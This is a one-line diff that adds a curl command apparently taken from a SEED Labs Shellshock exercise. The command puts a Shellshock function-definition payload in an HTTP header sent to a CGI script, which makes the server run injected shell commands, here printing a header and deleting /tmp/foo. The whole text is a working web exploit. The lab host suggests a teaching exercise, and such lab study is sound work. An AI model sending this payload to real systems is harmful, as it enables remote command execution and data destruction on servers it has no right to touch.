@@ -1,0 +1,2 @@
+curl -H "x: () { :; };echo Content-type: text/plain; echo; /bin/rm /tmp/foo" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+
